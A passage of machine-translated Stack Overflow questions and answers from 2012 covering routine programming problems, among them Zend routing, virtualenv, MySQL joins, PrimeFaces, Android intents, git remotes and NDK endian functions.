resources.router.routes.defaultmodule.abstract = On
resources.router.routes.defaultmodule.defaults.module = "default"

resources.router.routes.language.type = Zend_Controller_Router_Route
resources.router.routes.language.route = ":language"
resources.router.routes.language.reqs.language = "^(de|en)$"
resources.router.routes.language.defaults.language = "de"

resources.router.routes.default.type = Zend_Controller_Router_Route_Chain
resources.router.routes.default.chain = "language, defaultmodule"

resources.router.routes.login.route = ":language/@clients/@login"
resources.router.routes.login.defaults.module = "clients"
resources.router.routes.login.defaults.controller = "index"
resources.router.routes.login.defaults.action = "login" 
```

例如，我尝试在视图脚本中使用此代码切换语言：

```
<?php
$requestUri = Zend_Controller_Front::getInstance()->getRequest()->getRequestUri();
$uri = explode("/", $requestUri);
$lang = $uri[1];
?>

<?php if ($lang != "de"):?><a href="<?php echo $this->url(array('language' => 'de'), null, false);?>"><?php echo $this->translate('lang_de'); ?></a>&nbsp;<?php endif?>
<?php if ($lang != "en"):?><a href="<?php echo $this->url(array('language' => 'en'), null, false);?>"><?php echo $this->translate('lang_en'); ?></a>&nbsp;<?php endif?> 
```

当我阅读请求参数时，语言切换正确，但路线颠倒了。任何想法我该如何解决这个问题？

谢谢你，对不起我的英语不好。

# c++ - 有什么方法可以从外部控制 Photoshop 属性吗？

> ID：11702275
> 
> 赞同：0
> 
> 时间：2012-07-28T15:25:36.263
> 
> 标签：c++, c, photoshop

我正在编写一个小应用程序来更改 Photoshop 画笔的颜色。在 Photoshop 中，您必须转到颜色选择器并更改 RGB 值或手动选择新颜色。我想知道是否有办法将值发送到保存该值的变量/内存地址。

我还编写了一个应用程序来从外部程序更改画笔大小，但必须非常粗略地完成。我发现的唯一解决方案是发送“[”和“]”的实际击键，它们是画笔大小增大和画笔大小减小的热键。由于没有更改颜色的热键，因此此方法行不通。（我用 python 编写了这个程序，但我正在尝试为颜色问题找到 ac/c++ 解决方案）

想法会很棒:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:02:02.967

Photoshop 公开了它的 COM 接口，因此您应该能够使用 c#、c++ 等通过它访问这些属性。

试试这些：

[在 Windows 环境中从 C 或 C++ 访问 COM 接口](https://stackoverflow.com/questions/410005/accessing-com-interface-from-c-or-c-in-windows-environment)

[使用 C++ 或 C 访问应用程序的 COM 接口](https://stackoverflow.com/questions/410184/accessing-an-applications-com-interface-using-c-or-c)

或者对于 osx：

[http://macdevcenter.com/pub/a/mac/2004/04/16/com_osx.html](http://macdevcenter.com/pub/a/mac/2004/04/16/com_osx.html)

# python - 你如何复制一个virtualenv？

> ID：11702276
> 
> 赞同：3
> 
> 时间：2012-07-28T15:25:37.463
> 
> 标签：python, virtualenv

我刚开始在 python 中使用 virtualenv。

我在 virtualenv 上使用 pip 安装了几个包（？）。

是否有记录在 virtualenv 中安装了哪些软件包，以便我可以在不同的机器上复制相同的环境？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-28T15:26:59.273

在第一个虚拟环境中：

```
pip freeze > requirements.txt 
```

在第二个：

```
pip install -r requirements.txt 
```

简单的！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:46:40.900

另一种方法是使您的 virtualenv 可重定位，然后递归地复制它。

```
virtualenv --relocatable "$path_to_existing_virtual_env"
cp -r "$path_to_existing_virtual_env" "$path_to_duplicate_virtual_env" 
```

# c# - 如何使用命令行参数将应用程序最小化到托盘

> ID：11702277
> 
> 赞同：0
> 
> 时间：2012-07-28T15:25:38.910
> 
> 标签：c#

如何使用命令行参数将应用程序最小化到系统托盘。

例如：当我使用这样的命令行打开我的应用程序时。c:\myfile.exe 托盘

我为此写了一些代码，但它从来没有奏效。

```
static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (args.Length >0)
            {
                MessageBox.Show(args[0]);
            }
            Application.Run(new Form1());

        } 
```

此处消息框与我的论点“totray”一起显示。所以我只是添加了代码

```
static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (args.Length >0)
            {
               // MessageBox.Show(args[0]);
                if (args[0] == "totray") {
                    Form1 frm1 = new Form1();
                    frm1.Hide();
                }
            }
            Application.Run(new Form1());

        } 
```

但这个想法行不通。是否有可能得到表单的参数？我需要在这里写什么代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:37:49.747

我建议将 bool 传递给`Form`构造函数，并据此决定是否最小化。

将此构造函数添加到`Form1`：

```
public Form1(bool minimize) : this()
{
    if (minimize)
    {
        this.WindowState = FormWindowState.Minimized;
    }
} 
```

然后你可以这样调用它`Main`：

```
static void Main(string[] args)
{
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run(new Form1(args.Contains("totray")));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-31T19:09:33.767

您将需要调用`-tray`参数。请参阅[mozilla 支持命令行参数](https://developer.mozilla.org/en-US/docs/Mozilla/Command_Line_Options?redirectlocale=en-US&redirectslug=Command_Line_Options)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:29:06.900

`Environment.CommandLine`包含在命令行上传递的参数。
更好的[Environment.GetCommandLineArgs()](http://msdn.microsoft.com/en-us/library/system.environment.commandline.aspx)返回一个字符串数组，类似于传递给 main 方法的 string[] args，但第一个参数是可执行文件名。

不确定您是否需要将代码移动到 form_load 事件或表单构造函数中。

[MSDN 参考资料](http://msdn.microsoft.com/en-us/library/system.environment.commandline.aspx)

# c++ - 使用 new 创建指针数组，使它们未初始化为 NULL

> ID：11702278
> 
> 赞同：0
> 
> 时间：2012-07-28T15:25:46.010
> 
> 标签：c++, pointers, constructor

当我使用这个时：

```
int** newData = new int*[100]; 
```

我得到 100 个对象（指针）的数组，并在它们上调用默认构造函数，它导致指针为`NULL`.

如果这是代码的关键部分，并且我想避免数组无效，我可以以一种好的方式避免它吗？（不使用`malloc`）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:30:13.477

这是实施质量问题。不能保证在您显示的代码中初始化指针。没有其他方法可以在 C++ 中动态分配指针数组，以保证更高的性能。

（指针没有构造函数，它们要么已初始化，要么未初始化。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:37:22.507

在你的情况下没有`constructor`调用，你得到的是一个由 100 个指针组成的数组，这些指针要么恰好被零填充，要么编译器已经放置了一个代码来这样做。语言标准不要求在`new`调用 时初始化此数组。

现在，对于您的另一个问题：如果这是在`critical part of code`- 为什么不简单地在程序初始化时**预先分配**所需的数组？这样您就不必担心一些随机代码将您的指针设置为预定义的值。

# java - 在运行时从包中获取绝对类名

> ID：11702284
> 
> 赞同：0
> 
> 时间：2012-07-28T15:26:36.307
> 
> 标签：java

如果我们有一个包名，比如说 ..`com.google.foo.bar`它有像这样的类

> com.google.foo.bar.xyz
> 
> com.google.foo.bar.abc
> 
> . .

如何在运行时获取这些名称？绝对，我的意思是......包名+类名。有什么术语吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:37:21.733

```
public String getSourceBase(Class<?> classx)
{
    String cn = classx.getName().replace('.', '/') + ".class";
    // like "packagex/SourceBase.class"

    String s = classx.getResource('/' + cn).toExternalForm();
    // like "file:/javadir/Projects/projectX/build/classes/packagex/SourceBase.class"
    // or "jar:file:/opt/java/PROJECTS/testProject/dist/testProject.jar!/px/SourceBase.class"

    return s.substring(0, s.lastIndexOf(cn));
    // like "file:/javadir/Projects/projectX/build/classes/"
    // or "jar:file:/opt/java/PROJECTS/testProject/dist/testProject.jar!/"

} 
```

# jquery - 期望 HTMLImageElement 但在遍历 img 标签的 jQuery 列表时得到简单的对象

> ID：11702285
> 
> 赞同：2
> 
> 时间：2012-07-28T15:26:37.737
> 
> 标签：jquery

我正在收集imgs：

```
container.find('img') 
```

日志说这是 (console.log('img '+imgs[0]))

> [对象 HTMLImageElement]

但是当我用 each() 遍历这个列表时：

```
 container.find('img').each(function(idx) {
                var curr = $(this);
                                    console.log('curr ' + curr);

        }); 
```

我正进入（状态：

> [对象对象]

我认为这是我检查数组是否存在的另一个问题的原因：

```
 if (! jQuery.inArray(curr, hiddenImgs)) {
              hiddenImgs.push(curr);
            } 
```

即使我确定该元素不在数组中，我也得到了 FALSE ：/

这很疯狂。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:43:36.533

首先，要获得有用的日志结果，只需直接将其记录下来，而不是将其转换为字符串：

例子：

```
console.log( imgs[0] );
console.log( curr ); 
```

其次，在第一种情况下，您正在记录 Image 元素，在第二种情况下，您正在记录一个 jQuery 对象：

```
$(this) //<-- return a jQuery object wrapping `this`, the original element is in $(this)[0]
this //<-- plain this, it's the dom element itself. I.E. HTMLImageElement 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:44:29.543

你得到**[object Object]**因为当你`$(this)`在你的函数中调用时，你创建了一个引用图像元素的新 jQuery 对象，并且 jquery 对象的类型是**object**而不是**HTMLImageElement**。参见[jQuery( 选择器 [, context] )](http://api.jquery.com/jQuery/#jQuery1)

该函数在找不到匹配项时`inArray`返回**-1**而不是**0**，因此您必须将代码更改为：

```
if (jQuery.inArray(curr, hiddenImgs) == -1) {
              hiddenImgs.push(curr);
            } 
```

见[jQuery.inArray()](http://api.jquery.com/jQuery.inArray/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:46:14.660

在`.each()`尝试中：

`console.log('curr ' + curr.get(0));`

# ios - iOS Facebook Auth URL 方案

> ID：11702290
> 
> 赞同：0
> 
> 时间：2012-07-28T15:27:04.007
> 
> 标签：ios, facebook-authentication, url-scheme, facebook-authorization

我有一个奇怪的问题...

基于 Facebook 提供的示例“Hackbook”来演示 Facebook iOS SDK 的正确使用，我试图在我的应用程序中实现相同的东西。

有线的事情是：跳回我的应用程序仅在使用 Safari 进行身份验证时才有效。当我使用 Facebook 应用程序时，它不会跳回我的应用程序，而是奇怪地跳到我 iPhone 上仍然存在的“Hackbook”应用程序。

通过 Safari 进行身份验证在设备和模拟器上都可以正常工作。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:42:26.763

您是否在应用的 plist 中为 FacebookID 属性和 URL 方案使用自己的应用 ID？

如果两个应用程序注册相同的 URL（都具有相同的应用程序 ID 并同时安装在同一设备上），那么在一个实例中一个返回到另一个应用程序而在另一个实例中返回您的应用程序可能只是巧合。

# jquery - Django：如何为 JQuery 灯箱插件指定自定义媒体目录？

> ID：11702292
> 
> 赞同：0
> 
> 时间：2012-07-28T15:27:23.237
> 
> 标签：jquery, django

我正在尝试在我的 Django 应用程序中使用 jQuery LighBox 插件，因为 Javascript 似乎会生成 HTML 到硬编码的图像路径（例如 images/loading.gif）。如何自定义这些图像路径以使它们指向我的媒体目录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:33:16.750

您需要的不是“*媒体*”，而是“*静态*”文件。“*媒体*”旨在为用户提供图片等服务，而“*静态*”旨在包含静态内容（如 CSS 样式、JS 脚本、CSS 使用的图片、徽标等）。

详细指南在这里：[https ://docs.djangoproject.com/en/dev/howto/static-files/](https://docs.djangoproject.com/en/dev/howto/static-files/)

基本上，您需要将灯箱界面的静态文件放在`/static/`Django 应用程序目录中的某个位置。在部署期间，您需要使用[`collectstatic`](https://docs.djangoproject.com/en/dev/ref/contrib/staticfiles/#django-admin-collectstatic)管理命令将静态文件收集到单独的目录中。

如果您将`{{ STATIC_URL }}`在模板中使用，则将正确生成路径（`STATIC_URL`在具有请求上下文的模板中包含您的静态文件目录的 URL）。只需确保对静态文件使用正确的设置（主要是[`STATIC_URL`](https://docs.djangoproject.com/en/dev/ref/settings/#std%3asetting-STATIC_URL)和[`STATIC_DIR`](https://docs.djangoproject.com/en/dev/ref/settings/#std%3asetting-STATIC_ROOT)，详细信息在我给出的链接下）。

# mysql - Mysql内部加入OR条件？

> ID：11702294
> 
> 赞同：14
> 
> 时间：2012-07-28T15:27:44.233
> 
> 标签：mysql, subquery, inner-join

我有 2 个如下表

**location_distance**

```
----------------------------------------------
id   | fromLocid    | toLocid   |  distance
----------------------------------------------
1    |  3           |  5        |   70
2    |  6           |  8        |   15
3    |  2           |  4        |   63
... 
```

**其他表**

```
--------------------------------------------
Id  | fromLocid   | toLocid    | otherdata
--------------------------------------------
12  |  5          | 3          | xxxx
22  |  2          | 4          | xxxx   
56  |  8          | 6          | xxxx
78  |  3          | 5          | xxxx 
```

我想检索每行在 other_table 中的位置的黑白距离。这是我尝试过的

```
SELECT ot.*, ld.distance FROM other_table AS ot 
    INNER JOIN location_distance ld ON ld.fromLocid = ot.fromLocid AND ld.toLocid = ot.toLocid 
```

如果位置值反之亦然，这不会返回行。如何重写上述查询以产生预期结果？我应该在 join 子句中包含**OR**条件吗？像下面？

```
SELECT ot.*, ld.distance FROM other_table AS ot 
    INNER JOIN location_distance ld ON (ld.fromLocid = ot.fromLocid OR ld.fromLocid = ot.toLocid) AND (ld.toLocid = ot.fromLocid OR ld.toLocid = ot.fromLocid) 
```

**但是这个查询解释说“检查每条记录的范围”。..这是一种不好的做法吗？**

*结果*

```
--------------------------------------------------------
Id  | fromLocid | toLocid    | otherdata   | distance
--------------------------------------------------------
22  |  2        |   4        | xxxx        | 63
78  |  3        |   5        | xxxx        | 70 
```

*预期结果应该是*

```
-----------------------------------------------------
Id  | fromLocid   | toLocid   | otherdata  | distance
-----------------------------------------------------
12  |   5         |    3      | xxxx       | 70
22  |   2         |    4      | xxxx       | 63
56  |   8         |    6      | xxxx       | 15 
78  |   3         |    5      | xxxx       | 70 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-12T02:42:28.750

您可以使用 a 加入`location_distance`表两次`LEFT JOIN`，然后使用该`COALESCE()`函数返回正确的值`distance`：

```
select ot.id,
  ot.fromlocid,
  ot.tolocid,
  ot.otherdata,
  coalesce(ld1.distance, ld2.distance) distance
from other_table ot
left join location_distance ld1
  on ld1.fromLocid = ot.toLocid
  and ld1.toLocid = ot.fromLocid 
left join location_distance ld2
  on ld2.toLocid = ot.toLocid
  and ld2.fromLocid = ot.fromLocid 
```

请参阅[带有演示的 SQL Fiddle](http://www.sqlfiddle.com/#!2/bc831/16)

这将返回结果：

```
| ID | FROMLOCID | TOLOCID | OTHERDATA | DISTANCE |
---------------------------------------------------
| 12 |         5 |       3 |      xxxx |       70 |
| 22 |         2 |       4 |      xxxx |       63 |
| 56 |         8 |       6 |      xxxx |       15 |
| 78 |         3 |       5 |      xxxx |       70 | 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-28T16:55:06.567

加入距离表两次可能会更快

```
INNER JOIN location_distance ld1 ON ld1.fromLocid = ot.fromLocid AND ld1.toLocid = ot.toLocid
INNER JOIN location_distance ld2 ON ld2.toLocid = ot.fromLocid AND ld2.fromLocid = ot.toLocid 
```

然后使用一个 IF 来确定选择哪一个

```
IF(ld1.fromLocid, ld1.distance, ld2.distance) as distance 
```

# jsf - 如何让 Primefaces 与 @ConversationScoped Beans 一起工作？

> ID：11702297
> 
> 赞同：2
> 
> 时间：2012-07-28T15:28:11.607
> 
> 标签：jsf, tomcat, primefaces, cdi, myfaces

我使用 JSF-Compnents 构建了一个短页面，该页面显示并增加了来自 @ConversationScoped Bean 的值。此页面能够结束对话，并在结束旧对话后得到一个新的 Bean。这是它的样子：

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
   xmlns:h="http://java.sun.com/jsf/html"
   xmlns:f="http://java.sun.com/jsf/core"
   xmlns:p="http://primefaces.org/ui">
<h:head />
<h:body>
    <h:form>
      <h:outputText id="i" value="#{test.i}" />
      <h:commandButton value="increment" 
         actionListener="#{test.increment}" 
         update="i cid" />
      <h:outputText id="cid" 
         value="#{javax.enterprise.context.conversation.id}" />
      <h:commandButton value="end"
         actionListener="#{test.endConversation}"
         update="i cid" />
    </h:form>
</h:body>
</html> 
```

Bean 的代码非常简单：

```
package de.burghard.britzke.test.beans;

import java.io.Serializable;

import javax.annotation.PostConstruct;
import javax.enterprise.context.Conversation;
import javax.enterprise.context.ConversationScoped;
import javax.inject.Inject;
import javax.inject.Named;

@Named
@ConversationScoped
public class Test implements Serializable {

   @Inject Conversation conversation;
   private int i;

   @PostConstruct
   public void init() { 
      conversation.begin(); 
      System.out.println("init conversation"+conversation.getId());
   }

   public int getI() {   return i; }
   public void setI(int i) { this.i = i; }

   public void increment() { i++;System.out.println(i); }

   public void endConversation() {
      System.out.println("ending conversation "+conversation.getId());
      conversation.end();
   }
} 
```

**使用标准h:commandButton**组件时，一切正常。但是使用 Primefaces 组件**p:commandButton**然后每次单击“增量”按钮都会抓取一个新的 Bean 实例，因为 cid 参数没有传递给服务器。有人说这不是primefaces问题。但是为什么它使用标准组件而不是 primefaces 呢？我已经能够通过将**f:param**组件显式嵌入到 commandButton 组件中来传递 cid 参数，但是在销毁 Conversation 后，发送的参数没有产生错误的值。但它甚至应该在没有**f:param**组件的情况下工作。

是否有一个简短的教程如何使用 Primefaces 和对话范围的 bean（没有显式传递 cid 参数）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T12:22:52.180

在结束对话的情况下的问题`f:param`是，不应使用参数的无效值 (null) 传递参数`cid`。因此，使用以下代码更正此问题效果很好：

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:p="http://primefaces.org/ui">
<h:head />
<h:body>
    <h:form id="form">
        <h:outputText value="#{test.i}" />
        <p:commandButton value="increment"
            actionListener="#{test.increment}"
            update="@parent">
            <f:param 
                name="#{not empty javax.enterprise.context.conversation.id?'cid':''}"
                value="#{javax.enterprise.context.conversation.id}" />
        </p:commandButton>
        <h:outputText
            value="#{javax.enterprise.context.conversation.id}" />
        <p:commandButton value="end" actionListener="#{test.endConversation}"
            update="@parent">
            <f:param name="cid" value="#{javax.enterprise.context.conversation.id}" />
        </p:commandButton>
    </h:form>
</h:body>
</html> 
```

但我希望 primefaces 组件无需页面程序员显式传递`f:param`. 它们的行为应该像标准的 JSF (MyFaces) 组件一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-30T18:06:17.010

`<h:commandButton>`和之间的一个显着区别`<p:commandButton>`是 PrimeFaces 变体默认使用 AJAX。您似乎在某种程度上知道这一点，因为您一直在调整`update`参数`<p:commandbutton>`以更新视图。

考虑到这一点，我猜如果您将`<f:ajax>`自己与常规一起使用，您会遇到同样的问题`<h:commandButton>`，这表明这不是 PrimeFaces 问题。

至于您的实际问题，我不能肯定地说，但我遇到了在建立会话的同一请求中开始对话的问题。要对此进行测试，您可以尝试从链接到此测试页面的单独页面开始，或者代替您的`@PostConstruct`方法，将其放在方法的开头`increment()`：

```
if (conversation.isTransient()) {
    conversation.begin();
} 
```

我知道这不能解决您的问题，但也许它可以为您提供足够的信息来解决它。

# android - 如何设置另一个Activity的TextView？

> ID：11702299
> 
> 赞同：2
> 
> 时间：2012-07-28T15:28:19.667
> 
> 标签：android, android-layout

> **可能重复：**
> [如何在 Android 中的活动之间传递数据？](https://stackoverflow.com/questions/2091465/how-do-i-pass-data-between-activities-in-android)

我有两个活动。一个带有文本和图像视图，另一个带有按钮。

我想单击活动上的按钮，转到第二个活动并设置第二个活动的文本和图像。

谁能给我任何帮助？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:32:24.397

**1.**使用`Intent`。

**2.**为了简单起见，您可以使用`PutExtra()`意图**将数据发送到另一个活动**，并且可以**通过使用获取另一个活动的数据** `getExtras()`

**3.**您也可以`startActivityforResult()`用于**相同的目的**。

**////////////已编辑//////////**

**例如：**

**在活动类_One**

```
Intent i = new Intent(Class_One.this , Class_Two.class);
i.putExtra("Name", name);
startActivity(i); 
```

**在活动类_二**

```
Intent i = getIntent();
String name = i.getExtras().getString("Name"); 
```

# java - Java 中的 BDD 实现

> ID：11702301
> 
> 赞同：1
> 
> 时间：2012-07-28T15:28:34.513
> 
> 标签：java, prolog, theorem-proving, binary-decision-diagram

有人对 Java 中的 BDD（二进制决策图）实现（或提供 Java 绑定的实现）有建议吗？我在网上找到了这个页面：http: [//www.mancoosi.org/~abate/avalaible-bdd-libraries](http://www.mancoosi.org/~abate/avalaible-bdd-libraries)但不确定它是否已过时。还是只使用 Prolog 实现有意义？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:02:06.420

英文维基百科页面以几乎所有著名的编程语言提供了许多可能的 BDD 包。[http://en.wikipedia.org/wiki/Binary_decision_diagram](http://en.wikipedia.org/wiki/Binary_decision_diagram)

我没有尝试过，但 JavaBDD 可以连接到 CUDD，这是目前最好的 BDD 包之一。[http://javabdd.sourceforge.net/](http://javabdd.sourceforge.net/)

# c# - 在winform编辑器中自动更新分配给属性的图像？

> ID：11702304
> 
> 赞同：0
> 
> 时间：2012-07-28T15:28:51.500
> 
> 标签：c#, .net, winforms, compact-framework

我在 WinForms 中有一个控件，它有一个公开的图像属性，我给图像属性一个要使用的图像。

当我修改源图像时，控件仍然使用旧图像，我必须将图像重新分配给它，以便它显示新的更新图像。

我想知道是否可以自动化这个过程，所以当我更改源图像时，控件中使用的图像会自动更新？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:39:47.980

您将需要覆盖暴露的 Image 属性的 OnPaint 方法，以便在分配要使用的新图像时重新绘制

请参阅链接以获取更多信息[Control.OnPaint 方法](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.onpaint.aspx)

# iphone - 搜索栏 textDidChange

> ID：11702305
> 
> 赞同：5
> 
> 时间：2012-07-28T15:28:56.370
> 
> 标签：iphone, ios5, searchbar

在带有 searchBar 的 tableViewController 中，我使用以下方法：

```
-(void) searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText 
{
   ...my code
} 
```

当我直接在 searchBar 中输入文本时，它工作正常。

我现在遇到的问题是我想以编程方式调用此方法 - 这意味着我想从我知道如何做的代码中填写搜索栏（实际上我正在我的语言词典应用程序中选择一个最近搜索过的单词）和调用类似的东西：

```
 [SearchBar textDidChange: recentlySearchedWord] 
```

但这根本不适用于我的代码中的任何地方。

如果您知道如何解决这个问题，请帮助我。

谢谢，

蒂姆

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T16:08:44.410

如果您`- (void)searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText`在视图控制器（或任何类）中实现 UISearchBar 的委托方法，并且您想从同一个类中调用该方法，我假设这是您想要做的，您必须调用

```
[self searchBar:SearchBar textDidChange:recentlySearchedWord]; 
```

*SearchBar*是您引用的 UISearchBar 的实例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:56:40.900

textDidChange 不是类方法。所以不要打电话：

```
[SearchBar textDidChange: recentlySearchedWord]; 
```

称呼

```
[self searchBar:mySearchBar textDidChange: recentlySearchedWord]; 
```

或者如果 textDidChange 在不同的类中，使用 self 的类实例。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-10-30T15:21:08.563

如果它使任何事情变得更容易，您也可以尝试使用此代码。

```
<!DOCTYPE html>
<html>
<head>
<style>
input[type=text] {
    width: 100%;
    box-sizing: border-box;
    border: 2px solid #ccc;
    border-radius: 4px;
    font-size: 16px;
    background-color: white;
    background-image: url('searchicon.png');
    background-position: 10px 10px;
    background-repeat: no-repeat;
    padding: 12px 20px 12px 40px;
}
</style>
</head>
<body>

<p>Input with icon:</p>

<form>
  <input type="text" name="search" placeholder="Search..">
</form>

</body>
</html>
```

# javascript - jquery - 取消绑定不重新绑定

> ID：11702306
> 
> 赞同：0
> 
> 时间：2012-07-28T15:28:59.647
> 
> 标签：javascript, jquery, bind, unbind

我有以下代码：

```
$homeSlider.mouseenter(function() {
    console.log('enter');
    $slideInfo.animate({
        'bottom': -slideInfoHeight + 'px'
    });
});
$homeSlider.mouseleave(function() {
    console.log('leave');
    $slideInfo.animate({
        'bottom': '0px'
    });
});
$slideInfo.mouseenter(function() {
    $homeSlider.unbind('mouseenter');
    $homeSlider.unbind('mouseleave');
});
$slideInfo.mouseleave(function() {
    $homeSlider.bind('mouseenter');
    $homeSlider.bind('mouseleave');
}) 
```

我的 slideinfo div 绝对位于 homeSlider div 部分的顶部。如果您滚动 homeSlider，slideInfo 会隐藏自己 (-slideInfoHeight)，并在您滚动时显示自己。如果您将鼠标移到 slideInfo div 上，它会适当地保持可见，并且在您推出时保持可见。但是，当您回滚 homeSlider 时，它不再隐藏 slideInfo。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:42:50.950

我建议使用变量而不是连续绑定和解除绑定：

```
var preventAnimation = false;
$homeSlider.mouseenter(function() {
    if (preventAnimation) return;
    console.log('enter');
    $slideInfo.animate({
        'bottom': -slideInfoHeight + 'px'
    });
});
$homeSlider.mouseleave(function() {
    if (preventAnimation) return;
    console.log('leave');
    $slideInfo.animate({
        'bottom': '0px'
    });
});
$slideInfo.mouseenter(function() {
    preventAnimation = true;
});
$slideInfo.mouseleave(function() {
    preventAnimation = false;
}) 
```

另外，你可以看看[`.hover()`](http://api.jquery.com/hover/)！

# git - 在单个本地文件夹中维护 3 个远程存储库

> ID：11702308
> 
> 赞同：0
> 
> 时间：2012-07-28T15:29:09.903
> 
> 标签：git, tortoisegit

我正在使用乌龟 GIT。是否可以在单个本地文件夹中维护 2 个远程存储库？我有一个主远程存储库，然后有一个暂存远程存储库，它总是远远领先于主存储库。我创建了一个本地存储库并从主远程存储库中提取。然后我创建了一个新分支并尝试从远程临时存储库中提取，它给了我 1000 多个冲突和 3000 多个修改文件。我如何使用乌龟 GIT 解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-30T03:09:55.160

你的问题只是对`git pull`. 假设您的两个遥控器被调用`origin`and `staging`，而您正在处理的分支是`master`。

现在，您已`master`设置为远程跟踪`origin`。没关系。但现在你发出：

```
git pull staging master 
```

做什么`git pull`？它将指定的分支提取到`FETCH_HEAD`目录`.git`中，然后将其合并到您的当前分支中。这就是它所做的一切——在默认跟踪分支（如果命令未指定）或指定分支（如果是）上进行合并。

您正在获取暂存存储库的版本`master`并将其合并到`origin`存储库的`master`. 正如您所指出的，`staging`存储库“远远领先于”`origin`存储库。因此合并冲突。

你没有做错什么。事实上，在一个本地副本中跟踪多个存储库是 git 中的标准操作（在工作中，我跟踪 12）。

试试这个（再次，假设一个 repo 是`staging`，一个是`origin`，并且都使用`master`分支）：

```
git checkout -b development --track staging/master 
```

这将在本地签出一个名为“开发”的分支，该分支将设置为跟踪暂存存储库的主分支。您现在可以`git pull`根据需要在此分支上发布，知道它不会尝试将生产`master`分支合并到自身中，除非您明确告诉它这样做。

# android - 使用 NDK 进行交叉编译，未定义对 le32toh 和 be32toh 的引用

> ID：11702311
> 
> 赞同：3
> 
> 时间：2012-07-28T15:29:45.260
> 
> 标签：android, c, linker, android-ndk

我正在尝试构建一个共享库，最终交叉编译一段使用对*be32toh*和*le32toh*的引用的代码。如果我构建这段代码并从中创建一个可执行文件，我不会收到任何错误：

```
 include $(CLEAR_VARS) 
    LOCAL_SRC_FILES:= ubertooth.c ubertooth_helper.c 
    LOCAL_MODULE := ubertooth 
    LOCAL_C_INCLUDES += jni/libusb jni/libbtbb 
    LOCAL_SHARED_LIBRARIES := libc libusb libbtbb 
    LOCAL_LDLIBS := -L$(SYSROOT)/usr/lib -llog  
    include $(BUILD_EXECUTABLE) 
```

这里编译成功：

```
 Compile thumb  : ubertooth <= ubertooth.c
    Compile thumb  : ubertooth <= ubertooth_helper.c
    Executable     : ubertooth
    Install        : ubertooth => libs/armeabi/ubertooth 
```

*但是，当我尝试通过仅更改Android.mk*中的一行来将其构建为共享库时：

```
 include $(CLEAR_VARS) 
    ...
    include $(BUILD_SHARED_LIBRARY) 
```

我现在收到以下错误：

```
 Compile thumb  : ubertooth <= ubertooth.c
    Compile thumb  : ubertooth <= ubertooth_helper.c
    SharedLibrary  : libubertooth.so
    ./obj/local/armeabi/objs-debug/ubertooth/ubertooth.o: In function `stream_rx_file':
    ubertooth.c:224: undefined reference to `be32toh'
    ./obj/local/armeabi/objs-debug/ubertooth/ubertooth.o: In function `cb_lap':
    ubertooth.c:281: undefined reference to `le32toh'
    ./obj/local/armeabi/objs-debug/ubertooth/ubertooth.o: In function `cb_hop':
    ubertooth.c:417: undefined reference to `le32toh'
    ./obj/local/armeabi/objs-debug/ubertooth/ubertooth.o: In function `cb_btle':
    ubertooth.c:506: undefined reference to `le32toh'
    collect2: ld returned 1 exit status 
```

我不明白为什么在构建共享库时会出现此链接错误，但在构建可执行文件时却不会。而且，如果我想构建共享库，如何正确链接到我缺少的东西？

[这里是 ubertooth.c](http://ubertooth.svn.sourceforge.net/viewvc/ubertooth/trunk/host/bluetooth_rxtx/ubertooth.c?revision=560&view=markup)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:37:26.150

好吧，显然这些宏在 sys/endian.h 中的 NDK 中命名不同：

```
__uint64_t  htobe64(__uint64_t);
__uint32_t  htobe32(__uint32_t);
__uint16_t  htobe16(__uint16_t);
__uint64_t  betoh64(__uint64_t);
__uint32_t  betoh32(__uint32_t);
__uint16_t  betoh16(__uint16_t);

__uint64_t  htole64(__uint64_t);
__uint32_t  htole32(__uint32_t);
__uint16_t  htole16(__uint16_t);
__uint64_t  letoh64(__uint64_t);
__uint32_t  letoh32(__uint32_t);
__uint16_t  letoh16(__uint16_t); 
```

所以，我使用*了 letoh32*和*betoh32*

